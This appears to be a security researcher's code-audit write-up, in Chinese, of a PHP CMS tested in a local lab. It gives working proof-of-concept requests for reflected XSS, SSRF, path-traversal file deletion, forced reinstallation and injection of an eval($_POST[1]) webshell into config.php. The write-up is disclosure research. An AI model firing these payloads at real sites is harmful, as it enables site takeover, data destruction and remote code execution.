### 0x00 审计环境

```php
phpstudy(php5.6.27+Apache+mysql)
Windows10 64位
PHPStorm + seay代码审计工具
```

将源码放到WWW目录，访问/install安装即可

![1.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-f2502835f7225a7bfcd38dee81ddd21041ebf32e.png)

### 0x01 目录结构

![2.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-0f70cd46f8b03e5c8b05fc3954b9c3cca93fb508.png)

### 0x02 代码审计

审计习惯，先看install文件，测测有没有重装漏洞

![3.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-75608f32ca44079708e03165a7298690f98fddb5.png)

直接把需要删除的文件路径显示出来，那么如果后续存在任意文件删除漏洞，就可以配合达到重装的目的。接下来从index.php文件看起，配合代码审计工具进行审计，当然也可以配合一些漏洞扫描工具来更好的发现漏洞。

#### 前台XSS漏洞

##### 第一处

/apiRun.php

![4-1.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-d4af2c99159afd3e05135baa55071e935abde93c.png)

![4-2.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-749e9a72fb8d543a173490ee76dc799d84652e59.png)

AutoRun函数中，对GET方式传入的mode参数没有做任何处理，直接带入

![4-3.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-33dca18a97396ccbe39889b10ad984e9cd23ed70.png)

而要调用AutoRun函数，需mudi参数为autoRun，构造poc：  
`/apiRun.php?mudi=autoRun&amp;mode=";alert(/xss/);//`

漏洞验证：

![4-4.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-a71236bdf065ef22979343ad24150f4a71ded755.png)

##### 第二处

/read.php

![5-1.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-2287a8ba5e07ddd6a298b1a79ad55a82ba7606e8.png)

GetCityData函数中，idName参数没有做任何处理，带入GetCituOptionJs函数中  
跟进该方法

![5-2.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-23854441ec6054c20f84a9611c137ab814b497bd.png)

该方法中idName参数被直接带入DOM方法中输出

![5-3.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-ac7069a26905b2ded769a5b7e99ed53508bf949a.png)

要调用GetCityData函数需mudi参数，构造poc：  
`/read.php?mudi=getCityData&idName=alert(/xss/)`

漏洞验证：

![5.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-fa8e7fc4d256d85e863956a6f7c69485ef5a194c.png)

##### 第三处

/users\_deal.php

![6-1.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-a2ada7412ced27dc19bdcd74a1af392f1edf0c6c.png)

检测type是否为数组中的固定值，不是则带入AlertEnd方法中  
跟进该方法

![6-2.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-f3f523e5c209a5283f4f6d12a571f4bbfaa63c0e.png)

发现type被带\\&lt;script&gt;标签，使用AlertFilter函数处理后直接alert，跟进AlertFilter函数

![6-3.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-8c2d64ff6dff8665e22cce2f0a636b917411e501.png)

发现只是替换了回车和英文双引号，没有其他过滤，构造poc进行闭合:  
`/users_deal.php?mudi=mailSend&type=alert(/xss/)`

漏洞验证：

![6.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-e487523d767025b2cacd26f77b482f228be478e8.png)

#### 后台ssrf

漏洞关键代码  
/inc/classReqUrl.php

![8-2.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-065537fca5e1ee0a5f38c316c8f46d8004f9b12c.png)

函数UseCurl中，调用curl\_exec函数执行了一个curl会话，只有$url参数可控，即可造成ssrf漏洞

漏洞分析：  
/info\_deal.php

![8-3.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-0f05e9c21cab5d30cd828df95aea8e45d16370bd.png)

AddOrRev函数中

![8-4.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-bd47201208edf66be210970673ba4f98bbc22858.png)

此处第二个参数，即$img参数可控，看一下$img参数传入方式

![8-4-1.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-10b60cefd0d096e71e0de1dc821cfc88bd8d8efe.png)

![8-4-2.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-5c87a91ed345da4acc425f7697365203c3fd3e02.png)

![8-4-3.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-9c940cf57f50ffad75044bdc449fc7834af61613.png)

$img参数通过POST方式传入，并且无过滤措施  
继续跟进SaveRemoteFile函数

![8-5.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-9fb6e5311f7513520e0edcb398397718de7d866b.png)

第二个参数被带入GetUrlContent函数，跟进GetUrlContent函数

![8-6.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-33be42cf106d54cb8c151f3b71019b8f61631186.png)

同样，根据可控参数的带入，跟进UseAuto函数，并且此处传入3个参数 0，GET，$url

![8-7.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-39b662c82758a8d4cd855eaa7b3178edff50243b.png)

根据传入第一个参数$seMode为0，会调用UseCurl函数，即进入漏洞关键函数

目前已知漏洞触发链条，接下来只需要根据进入函数的条件，构造poc即可

首先需要进入AddOrRev函数，只需$mudi值为add

![8-8.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-04bafe9adad0e932b3f9c0bf77fc99dfbc69d716.png)

然后需要满足进入SaveRemoteFile函数的条件

![8-10.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-70cbc55ccaaabe5a4981a31e55c9d1ea4872b584.png)

![8-11.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-31f85d1f0385d7eeb68ef4947f32584e718d5b68.png)

![8-12.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-3c107988c3cda9d1a12e045431d23ec95473c154.png)

最终构造poc如下:

```php
POST /admin/info deal.php?mudi=add
isSavelmg=1&img=URL&theme=1&typeStr=1&time=1
```

漏洞验证：

![8.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-bdfb5e7438ae54965b1fecb6ab276f4174e065cd.png)

成功收到请求

![8-1.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-52afc8eb4550e0a4273b4b20b142540811b97927.png)

#### 任意文件删除漏洞

漏洞关键代码  
/userCenter\_deal.php

![9-1.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-f7a9dd0bdf0a12643286ee0166b474fd1f89a012.png)

函数Del中，对路径参数无任何过滤，直接使用unlink函数删除文件

漏洞分析  
usersCenter\_deal.php

![9-2.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-4ba05beca7232b5ca00b659514985a442152207d.png)

跟进rev函数

![9-3.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-0e890da92510354c5c78883bdd50c2241b9a2db6.png)

POST传入revType参数的值，然后根据revType的值决定后续走向，继续往下

![9-4.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-1e878657575d9520b5bcced3fb4d1385a3601e73.png)

首先使用PostRegExpStr函数处理几个参数值，跟进该函数

![9-5.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-35c93f885c2e4bbea5e64bd7053e91ac8cd0df3a.png)

![9-6.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-c499638b96bdf2af2cc8d37cf11f61d8903f3c0c.png)

![9-7.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-3ec8433702d3a051f135073eca53715a3c265472.png)

通过正则匹配将一些字符替换为空

回到rev函数

![9-8.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-f64ee30eaf03f846eb92db7172ec34902d8c45be.png)

获取用户信息，此处需要前台用户登录才能继续往下

![9-9.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-a902becbd224b92a9793b5a5aa9fc26b7ea62d8a.png)

在这里进入漏洞触发点Del函数

回过头开始构造poc

![9-10.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-7e2a03176f5eb3f2d29e04e7ea35b5b0c864101e.png)

首先进入rev函数需$mudi值为rev

![9-11.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-56a3d982d8c3d1352cf1177b21fbeb2595fe8710.png)

然后3个$dashangImg参数长度之和不能小于5

构造poc如下

```php
POST /usersCenter_deal.php?mudi=rev
revType=app&dashangImg1=11&dashangImg2=11&dashangImg3=11&dashangImg1Old=../../1.txt
```

![9-12.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-19282dd18b524eac3f37c284f440b73cfb8e1702.png)

进行漏洞验证时发现无法执行，搜索提示找到代码

![9-13.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-fe1595073e804362c00d221d7f823bb401b8a1d7.png)

![9-14.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-e25a749c21d0f7a0e172a8b821968934af69b637.png)

```php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && (empty($_SERVER['HTTP_REFERER']) || preg_replace("tps?:\/\/([^\:\/]+).*/i", "\\1", $_SERVER['HTTP_REFERER']) !== preg_replace("/([^\:]+).*/", "\\1", $_SERVER['HTTP_HOST']))) 
```

OutSubmit函数中，检查请求方式是否为POST并且Referer是否和Host相同，那么构造最终poc如下：

```php
POST http://www.ot.com/usersCenter\_deal.php?mudi=rev
Referer:http://www.ot.com
revType=app&dashangImg1=11&dashangImg2=11&dashangImg3=11&dashangImg1Old=../../1.txt
```

漏洞验证

![9-15.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-ec2379fc1eb5be32d1f8c6085594ec39bf7e1da6.png)

成功删除文件

#### 系统重装漏洞

根据之前知道的install.lock文件的位置，配合文件上传漏洞，即可将install.lock删除

![9-16.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-d1adbfff2b95f595787dc1b73ab4db0eb8a80863.png)

删除后访问/install

![9-17.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-cbd23054be843d0f7174812769f316d8d8cacdbf.png)

成功访问到重装页面

**重装写shell**

![9-18.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-454c91f1701f35dfef961543efab30d890f470f5.png)

安装系统时，通过Write函数将一些值写入config.php

参数如下

![9-19.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-098b9747b3e5ce612578b2b5de31d99f552017e9.png)

![9-20.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-4ef78709997795a762e2dcbac6719c7efc306630.png)

accBackupDir参数通过POST传入，没有过滤

![9-21.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-c5411a4e13e700ab55ce48f3daa8492367d32879.png)

构造poc进行闭合

```php
POST /install/index.php?mudi=run
adminName=admin&adminPwd=admin&adminDir=admin&dbType=mysql&accName=%23+OTCMS%40%21db%2522.db&accDir=Data&sqlIp=localhost&sqlPo=3306&sqlUsername=root&sqlUserPwd=123456&sqlDbName=OTCMS&sqlPref=OT_&isImport=2&mysqlState=1&accBackupDir=Data_backup');eval($_POST[1]);#
```

成功写入shell

![9-22.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-bf272c12056e7a39e006de5d200845c7bdee899b.png)

访问发现config.php

![9-23.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-63df6498fb6170acfcb6656f4a21e9aae4d32ffc.png)

发现对该文件的访问进行了限制

![9-24.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-49878ac1485bb3b545ec74e4417134ece96ccc02.png)

/install/index.php包含了该文件

![9-25.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-181c0a31b8c75ed986c836c2e48ef371a94d57c0.png)

成功getshell